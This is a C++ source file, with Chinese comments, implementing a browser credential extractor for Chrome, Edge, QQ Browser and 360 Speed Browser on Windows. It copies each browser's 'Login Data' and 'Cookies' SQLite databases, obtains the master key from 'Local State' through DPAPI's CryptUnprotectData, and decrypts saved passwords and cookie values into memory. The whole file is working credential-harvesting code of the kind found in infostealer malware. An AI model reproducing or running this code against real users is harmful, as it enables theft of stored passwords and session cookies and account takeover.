#include "stdafx.h"
#include "GetBrowserInfo.h"
#include <io.h>
//#include <stdio.h>      /* printf, NULL */
//#include <stdlib.h>     /* strtoll */
using namespace std;

#if defined(_MSC_VER)
#define strtoll _strtoi64
#endif


#if defined(_MSC_VER)
#define strtoull _strtoui64
#endif


#define va_copy(dest, src)(dest = src)
GetBrowserInfo::GetBrowserInfo(BroType brot) :m_brot(brot)
{
	switch (m_brot)
	{
	case  chrome:
		m_BroDir = "\\Google\\Chrome\\";
		m_BroName = "Chrome";
		break;
	case  QQ:
		m_BroDir = "\\Tencent\\QQBrowser\\";
		m_BroName = "QQBrowser";
		break;
	case  edge:
		m_BroDir = "\\Microsoft\\Edge\\";
		m_BroName = "Edge";
		break;
	case  speed360:
	{
		m_BroDir = "\\360Chrome\\Chrome\\";
		m_BroName = "speed360";
		// 寻找360极速浏览器是否存在登录的db文件
		std::string login360DBPath = GetFullPathFromRelativeToBro("User Data\\default\\");
		Find360SPLoginDB(login360DBPath);
		break;
	}
	default:
		m_isOk = false;
		return;
	}

	

	m_isOk = true;

	// 获取chrome数据json文件以及sql db文件目录位置
	m_loginDataPath = GetFullPathFromRelativeToBro("User Data\\default\\Login Data");
	m_localStatePath = GetFullPathFromRelativeToBro("User Data\\Local State");

	if (m_loginDataPath == "") {
		
		m_isOk = false;
	}

	// 文件是否存在
	if (_access(m_loginDataPath.c_str(), 0) != 0)
	{
		if (m_brot ==  speed360)
		{
			std::shared_ptr<BYTE> db360Path = MyGetRegValueA(HKEY_CLASSES_ROOT, "360ChromeURL\\DefaultIcon", "");

			if (db360Path == nullptr)
			{
				m_isOk = false;
				return;
			}

			// db文件路径
			m_loginDataPath = replaceALL((char*)db360Path.get(), "Chrome\\Application\\360chrome.exe,5", "Chrome\\User Data\\default\\Login Data");
			m_localStatePath = replaceALL((char*)db360Path.get(), "Chrome\\Application\\360chrome.exe,5", "Chrome\\User Data\\Local State");

			if (_access(m_loginDataPath.c_str(), 0) != 0)
			{
				m_errCode = BROWSER_LOGIN_DATA_NOT_FIND;
				m_isOk = false;
			}

		}
		else
		{
			m_errCode = BROWSER_LOGIN_DATA_NOT_FIND;
			m_isOk = false;
		}
	}



	// 获取cookie 只支持chrome的cookies获取
	if (brot ==  chrome) {
		m_isOkCookieChrome = true;
		m_chromeCookiespath = GetFullPathFromRelativeToBro("User Data\\Default\\Cookies");

		if (m_loginDataPath == "") {
			m_isOkCookieChrome = false;
		}

		// 文件是否存在
		if (_access(m_loginDataPath.c_str(), 0) != 0)
		{
			m_errCode = BROWSER_COOKIES_NOT_FIND;
			m_isOkCookieChrome = false;
		}
	}


}


GetBrowserInfo::~GetBrowserInfo()
{
	
}


std::string GetBrowserInfo::GetFullPathFromRelativeToBro(LPCSTR relative)
{
	LPSTR pathToLocal;
	size_t pathToLocalLength; // Contains null terminator.
	if (_dupenv_s(&pathToLocal, &pathToLocalLength, "LOCALAPPDATA") || !pathToLocal)
	{
		m_errCode = BROWSER_LOCALAPPDATA_NOT_FIND;
		return "";
	}

	size_t resultLength = pathToLocalLength + strlen(m_BroDir.c_str()) + strlen(relative);

	std::string result = pathToLocal;
	result += m_BroDir;
	result += relative;

	free(pathToLocal);
	return result;
}


DWORD GetBrowserInfo::GetCookies(std::vector<BrowserCookies> *pBroCookies)
{
	// 是否能获取到json key 来决定版本
	DATA_BLOB masterKey={};
	bool isVerNew80 = GetMasterKey(&masterKey);

	// sql db拷贝至本地进行解析
	LPCSTR CookiesTemporaryCopyPath = "Cookies.tmp";
	remove(CookiesTemporaryCopyPath);
	if (!CopyFileA(m_chromeCookiespath.c_str(), CookiesTemporaryCopyPath, TRUE)) {
		m_errCode = BROWSER_COOKIES_DATA_FAILED;
		return false;
	}

	sqlite3* connection;
	if (sqlite3_open(CookiesTemporaryCopyPath, &connection) != SQLITE_OK)
	{
		m_errCode = BROWSER_SQLITE_OPEN_FAILED;
		return false;
	}

	LPCSTR query = "SELECT host_key, name, path, encrypted_value,expires_utc,has_expires,is_persistent FROM cookies";
	sqlite3_stmt* result;
	if (sqlite3_prepare_v2(connection, query, -1, &result, 0) != SQLITE_OK)
	{
		m_errCode = BROWSER_SQLITE_PREPARE_FAILED;
		return false;
	}


	while (sqlite3_step(result) != SQLITE_DONE)
	{
		BrowserCookies bdata;
		bdata.bro_name		= m_BroName;
		bdata.host_key		= (char*)sqlite3_column_text(result, 0);
		bdata.name			= U2G((char*)sqlite3_column_text(result, 1)); // U2G 中文乱码
		bdata.path			= (char*)sqlite3_column_text(result, 2);
		bdata.has_expires	= (char*)sqlite3_column_text(result, 5);
		bdata.is_persistent = (char*)sqlite3_column_text(result, 6);

		__int64 time64 = strtoll((const char*)sqlite3_column_text(result, 4), NULL, 10);
		bdata.expire_UTC = int64timeToStr(time64);


		const DATA_BLOB encryptedPassword = { sqlite3_column_bytes(result, 3), (BYTE*)sqlite3_column_blob(result, 3) };
		BYTE decryptedPasswordBuf[2048];
		memset(decryptedPasswordBuf, 0, 2048);
		DATA_BLOB decryptedPassword = { 0, decryptedPasswordBuf };

		// 尝试旧版本解密
		bool ret = _getPwd((BYTE*)sqlite3_column_text(result, 3), sqlite3_column_bytes(result, 3) + 1, bdata.value);

		// 失败了尝试新版本解密
		if (ret == false)
		{
			// 80以后的版本 DecryptPassword 来解密
			if (isVerNew80)
			{
				if (DecryptPassword(encryptedPassword, masterKey, &decryptedPassword)) {
					bdata.value = (char*)decryptedPassword.pbData;
				}
				else {
					bdata.value = "failed";
				}
			}
		}

		pBroCookies->push_back(bdata);
	}

	sqlite3_finalize(result);
	sqlite3_close(connection);
	remove(CookiesTemporaryCopyPath);

	LocalFree(masterKey.pbData);

	return true;
}

BOOL GetBrowserInfo::GetAllCookies(std::vector<BrowserCookies> *pBroCookies)
{

	bool ret = false;

	switch (m_brot)
	{
	case  chrome:
	{
		if (!m_isOkCookieChrome) {

			if (m_errCode == BROWSER_SUCCESS) {
				m_errCode = BROWSER_UNKNOW_FAILED;
			}
		}
		else
		{
			ret = (GetCookies(pBroCookies))?true:false;
		}

		break;
	}
	case  edge:
		break;
	case  QQ:
		break;
	case  speed360:
		break;
	case  safe360:
		break;
	default:
		break;
	}

	
	return ret;
}


BOOL GetBrowserInfo::GetAllData(std::vector<BrowserData> *pBroData)
{

	BrowserData errData;

	bool ret = (GetData(pBroData))?true:false;

	if (logindbver.size() > 0)
	{
		/*for (auto loginPaths: logindbver)
		{*/
		for (vector<string>::iterator iter = logindbver.begin(); iter != logindbver.end(); iter++)
		{
			m_BroName = "login speed 360";
			m_loginDataPath = *iter;
			GetData(pBroData);
		}

	}


	if (m_errCode!= BROWSER_SUCCESS){
		errData.bro_name = m_BroName;
		errData.bro_url = " x ";
		errData.user_name = " x ";
		errData.create_time = " x ";
		errData.pass_word = " x ";
	}
	else
	{
		errData.bro_name = m_BroName;
		errData.bro_url = " - ";
		errData.user_name = " - ";
		errData.create_time = " - ";
		errData.pass_word = " - ";
	}

	pBroData->push_back(errData);


	return ret;

}


DWORD GetBrowserInfo::GetData(std::vector<BrowserData> *pBroData)
{

	//m_loginDataPath = (LPSTR)R"(E:\sample\20210712\360jisu\Login Data)";
	//m_localStatePath = (LPSTR)R"(E:\sample\20210712\360jisu\Local State)";
	//
	//m_isOk = true;
	if (!m_isOk){

		if (m_errCode == BROWSER_SUCCESS){

			m_errCode = BROWSER_UNKNOW_FAILED;
		}
		return false;
	}

	// 是否能获取到json key 来决定版本
	DATA_BLOB masterKey={};
	bool isVerNew80 = GetMasterKey(&masterKey);

	// sql db拷贝至本地进行解析
	LPCSTR loginDataTemporaryCopyPath = "Login Data.tmp";
	remove(loginDataTemporaryCopyPath);
	if (!CopyFileA(m_loginDataPath.c_str(), loginDataTemporaryCopyPath, TRUE)){
		m_errCode = BROWSER_COPY_LOGIN_DATA_FAILED;
		return false;
	}

	sqlite3* connection;
	if (sqlite3_open(loginDataTemporaryCopyPath, &connection) != SQLITE_OK)
	{
		m_errCode = BROWSER_SQLITE_OPEN_FAILED;
		return false;
	}

	LPCSTR query = "SELECT origin_url, username_value, password_value,date_created FROM logins";
	sqlite3_stmt* result;
	if (sqlite3_prepare_v2(connection, query, -1, &result, 0) != SQLITE_OK)
	{
		m_errCode = BROWSER_SQLITE_PREPARE_FAILED;
		return false;
	}


	while (sqlite3_step(result) != SQLITE_DONE)
	{
		BrowserData bdata;
		bdata.bro_name = m_BroName;
		bdata.bro_url = (char*)sqlite3_column_text(result, 0);
		bdata.user_name = U2G((char*)sqlite3_column_text(result, 1)); // U2G 中文乱码
		__int64 time64 = strtoll((const char*)sqlite3_column_text(result, 3), NULL, 10);
		bdata.create_time = int64timeToStr(time64);
	
		const DATA_BLOB encryptedPassword = { sqlite3_column_bytes(result, 2), (BYTE*)sqlite3_column_blob(result, 2) };
		BYTE decryptedPasswordBuf[512];
		DATA_BLOB decryptedPassword = { 0, decryptedPasswordBuf };

		// 尝试旧版本解密
		 bool ret = _getPwd((BYTE*)sqlite3_column_text(result, 2), sqlite3_column_bytes(result, 2) + 1, bdata.pass_word);

		 // 失败了尝试新版本解密
		 if (ret == false)
		 {
			 // 80以后的版本 DecryptPassword 来解密
			 if (isVerNew80)
			 {
				 if (DecryptPassword(encryptedPassword, masterKey, &decryptedPassword)) {
					 bdata.pass_word = (char*)decryptedPassword.pbData;
				 }
				 else {
					 bdata.pass_word = "failed";
				 }
			 }
		 }

		pBroData->push_back(bdata);
	}

	sqlite3_finalize(result);
	sqlite3_close(connection);
	remove(loginDataTemporaryCopyPath);

	LocalFree(masterKey.pbData);

	return true;
}

LPCSTR GetBrowserInfo::ParseEncryptedKey(LPSTR* buf)
{
	FILE* jsonFile;

	// 传参进行打开解析文件
	//LPSTR localStatePath = GetFullPathFromRelativeToBro("User Data\\Local State");
	 fopen_s(&jsonFile, m_localStatePath.c_str(), "rt");
	 //free(localStatePath);

	
	if (!jsonFile)
		return "err";
		//return "Failed to open \"Local State\" json file.";

	size_t fileSize = FileSize(jsonFile);
	char* fileContent = (char*)malloc(fileSize);
	if (!fileContent)
		return "err";
		//return "Failed to allocate memory for file content";
	fread_s(fileContent, fileSize, fileSize, 1, jsonFile);
	fclose(jsonFile);

	cJSON* json = cJSON_Parse(fileContent);
	if (!json)
		return "err";
		//return "Failed to parse json.";

	const cJSON* os_crypt = cJSON_GetObjectItemCaseSensitive(json, "os_crypt");
	if (!os_crypt || !cJSON_IsObject(os_crypt))
		return "err";
		//return "Failed to parse \"os_crypt\".";

	const cJSON* encrypted_key = cJSON_GetObjectItemCaseSensitive(os_crypt, "encrypted_key");
	if (!encrypted_key || !cJSON_IsString(encrypted_key))
		return "err";
		//return "Failed to parse \"encrypted_key\".";

	LPCSTR encryptedKey = encrypted_key->valuestring;
	size_t encryptedKeyLength = strlen(encryptedKey);

	*buf = (LPSTR)malloc(encryptedKeyLength + 1);
	strcpy_s(*buf, encryptedKeyLength + 1, encryptedKey);

	cJSON_Delete(json);
	free(fileContent);

	return NULL;
}

bool GetBrowserInfo::GetMasterKey(DATA_BLOB* pDatab)
{
	LPSTR encryptedKeyBase64;
	LPCSTR errorStr = ParseEncryptedKey(&encryptedKeyBase64);
	if (errorStr)
	{
		return false;
	}

	size_t encryptedKeyLength = Base64decode_len(encryptedKeyBase64);
	LPSTR encryptedKey = (LPSTR)malloc(encryptedKeyLength);
	Base64decode(encryptedKey, encryptedKeyBase64);
	free(encryptedKeyBase64);

	// Removing "DPAPI" (5 symbols)
	DATA_BLOB dataIn = { (DWORD)encryptedKeyLength - 5, (BYTE*)(encryptedKey + 5) };

	// 通常，唯一能够解密数据的用户是具有与加密数据的用户相同的徽标凭据的用户。
	// 此外，加密和解密必须在同一台计算机上进行。所以只能在用户身上进行解密返回数据
	if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, pDatab))
	{
		return false;
	}

	free(encryptedKey);

	return true;
}



// 寻找 360 极速浏览器 login db
void GetBrowserInfo::Find360SPLoginDB(std::string lpPath)
{
	
	WIN32_FIND_DATAA FindFileData;

	std::string findPath = lpPath;
	findPath += "*";

	HANDLE hFind = ::FindFirstFileA(findPath.c_str(), &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)    return;


	while (true)
	{
		// 用户文件夹一般 格式为 360UIDxxxxxxxxxx_xx 
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (FindFileData.cFileName[0] == '3'&&
				FindFileData.cFileName[1] == '6'&&
				FindFileData.cFileName[2] == '0'&&
				FindFileData.cFileName[3] == 'U'&&
				FindFileData.cFileName[4] == 'I'&&
				FindFileData.cFileName[5] == 'D')
			{
				std::string dbpath = lpPath + FindFileData.cFileName;
				dbpath += "\\Login Data";
				// 文件是否存在
				if (_access(dbpath.c_str(), 0) != 0)
				{
					break;
				}
				logindbver.push_back(dbpath);
			}

		}


		if (!FindNextFileA(hFind, &FindFileData))    break;
	}
	FindClose(hFind);
}